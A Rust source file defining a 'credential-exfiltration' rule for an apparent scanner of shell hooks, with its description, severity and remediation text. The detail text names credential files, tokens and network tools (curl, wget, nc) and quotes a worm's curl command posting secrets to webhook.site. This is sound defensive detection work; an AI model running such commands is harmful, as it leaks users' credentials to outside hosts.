// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Sysogen Lda

//! The `credential-exfiltration` rule.

use super::{SHELL, shell_sites};
use crate::finding::{Finding, RuleId, Severity};
use crate::rule::{Examined, Rule, Subject};
use crate::shell;

/// See [`Rule::detail`] for what this flags and why.
pub struct CredentialExfiltration;

impl Rule for CredentialExfiltration {
    fn id(&self) -> RuleId {
        RuleId::CredentialExfiltration
    }

    fn name(&self) -> &'static str {
        "credential-exfiltration"
    }

    fn severity(&self) -> Severity {
        Severity::High
    }

    fn description(&self) -> &'static str {
        "A credential file, a token or the whole environment sent over the network"
    }

    fn detail(&self) -> &'static str {
        "A hook sends a credential over the network: the environment, a token a \
                tool prints such as gh auth token, a credential file such as \
                ~/.aws/credentials or ~/.npmrc, or what a cloud metadata service \
                answers, piped, redirected, uploaded or substituted into what curl, wget \
                or nc sends. The Shai-Hulud worm (StepSecurity, 15 September 2025) sent \
                a workflow's secrets with curl -d \"$CONTENTS\" https://webhook.site/..., \
                and the compromised nx packages (StepSecurity, 27 August 2025) ran gh \
                auth token and read ~/.npmrc before uploading what they found."
    }

    fn remediation(&self) -> &'static str {
        "Remove the command unless sending that credential is what the hook is \
                for. A token meant for a service belongs in the header or user that \
                service authenticates, sent to that service alone. If the hook came from \
                someone else, rotate every credential it could reach."
    }

    fn reads(&self) -> &'static [Subject] {
        SHELL
    }

    fn check(&self, at: &Examined<'_>, width: usize) -> Vec<Finding> {
        shell_sites(at, shell::credentials_sent, self.id(), width)
    }
}
